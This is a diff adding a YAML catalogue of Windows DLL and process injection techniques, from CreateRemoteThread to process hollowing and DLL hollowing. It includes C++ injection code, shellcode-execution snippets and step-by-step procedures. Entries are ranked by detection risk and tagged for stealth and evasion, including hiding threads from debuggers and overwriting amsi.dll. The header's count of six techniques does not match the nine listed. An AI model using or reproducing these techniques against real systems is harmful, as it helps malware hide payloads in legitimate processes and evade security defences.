@@ -1,0 +1,119 @@
+# =====================================================
+# DLL Injection Methods — 6 Techniques
+# =====================================================
+
+methods:
+  create_remote_thread:
+    name: "CreateRemoteThread + LoadLibrary"
+    difficulty: beginner
+    detection_risk: high
+    desc: "Allocate memory → write DLL path → CRT with LoadLibrary"
+    code: |
+      bool InjectDLL(DWORD pid, const std::wstring& dllPath) {
+          auto hProc = MakeHandle(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid));
+          auto allocSize = (dllPath.size() + 1) * sizeof(wchar_t);
+          RemoteMemory remote(hProc.get(), allocSize);
+          WriteProcessMemory(hProc.get(), remote.get(), dllPath.c_str(), allocSize, nullptr);
+          auto loadLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
+          auto hThread = CreateRemoteThread(hProc.get(), nullptr, 0,
+              reinterpret_cast<LPTHREAD_START_ROUTINE>(loadLib), remote.get(), 0, nullptr);
+          WaitForSingleObject(hThread, INFINITE);
+          CloseHandle(hThread);
+          return true;
+      }
+
+  manual_mapping:
+    name: "Manual Mapping"
+    difficulty: advanced
+    detection_risk: low
+    desc: "Load PE manually: parse headers → map sections → fix relocations → resolve imports → DllMain"
+    steps:
+      - "Read DLL file to buffer"
+      - "Allocate remote memory (size = SizeOfImage)"
+      - "Map PE sections to correct RVAs"
+      - "Fix base relocations (delta = remote_base - preferred_base)"
+      - "Resolve imports (walk IAT, LoadLibrary + GetProcAddress)"
+      - "Execute TLS callbacks"
+      - "Call DllMain(DLL_PROCESS_ATTACH) via shellcode"
+      - "Erase PE headers from remote memory"
+
+  reflective_loading:
+    name: "Reflective DLL Loading"
+    difficulty: advanced
+    detection_risk: low
+    desc: "DLL loads itself — reflective loader embedded in DLL"
+    advantage: "No LoadLibrary call, no PEB entry"
+
+  thread_hijacking:
+    name: "Thread Hijacking"
+    difficulty: intermediate
+    detection_risk: medium
+    desc: "Suspend existing thread → Set RIP to shellcode → Resume"
+    code: |
+      SuspendThread(hThread);
+      CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
+      GetThreadContext(hThread, &ctx);
+      ctx.Rip = (DWORD64)shellcodeAddr;
+      SetThreadContext(hThread, &ctx);
+      ResumeThread(hThread);
+
+  apc_injection:
+    name: "APC Queue Injection"
+    difficulty: intermediate
+    detection_risk: medium
+    desc: "Queue APC to alertable thread"
+    code: |
+      QueueUserAPC((PAPCFUNC)loadLibAddr, hThread, (ULONG_PTR)remoteDllPath);
+
+  dll_sideloading:
+    name: "DLL Sideloading / Proxy"
+    difficulty: intermediate
+    detection_risk: "very low — appears legitimate"
+    desc: "Replace legitimate DLL with proxy that loads original + payload"
+    advantage: "No injection API calls at runtime"
+
+  process_hollowing:
+    name: "Process Hollowing (RunPE)"
+    difficulty: advanced
+    detection_risk: medium
+    desc: "Create suspended legitimate process → unmap its memory → inject payload → resume"
+    steps:
+      - "CreateProcess(target.exe, CREATE_SUSPENDED)"
+      - "NtUnmapViewOfSection(hProcess, imageBase)"
+      - "VirtualAllocEx at preferred base (or rebase)"
+      - "Write PE sections to remote memory"
+      - "Fix relocations if base differs"
+      - "Set thread context: ctx.Rcx = new entry point"
+      - "ResumeThread()"
+    detection: "VAD/PEB mismatch reveals hollowing — memory forensics"
+    tags: [process_injection, advanced, evasion]
+
+  nt_create_thread_ex:
+    name: "NtCreateThreadEx (Stealth CRT)"
+    difficulty: advanced
+    detection_risk: low
+    desc: "Direct ntdll call — supports THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER"
+    code: |
+      using NtCreateThreadEx_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
+          HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+      auto NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(
+          GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
+      HANDLE hThread = nullptr;
+      NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
+          shellcodeAddr, nullptr,
+          0x4 /*THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER*/,
+          0, 0, 0, nullptr);
+    tags: [stealth, ntapi, advanced]
+
+  dll_hollowing:
+    name: "DLL Hollowing"
+    difficulty: advanced
+    detection_risk: low
+    desc: "Load legitimate DLL → overwrite .text section with payload"
+    steps:
+      - "LoadLibrary legitimate large DLL (e.g. amsi.dll)"
+      - "VirtualProtect .text section to RWX"
+      - "Overwrite with payload shellcode"
+      - "Execute from within legitimate module context"
+    advantage: "Call stack shows legitimate DLL — not suspicious"
+    tags: [section_overwrite, stealth, advanced]
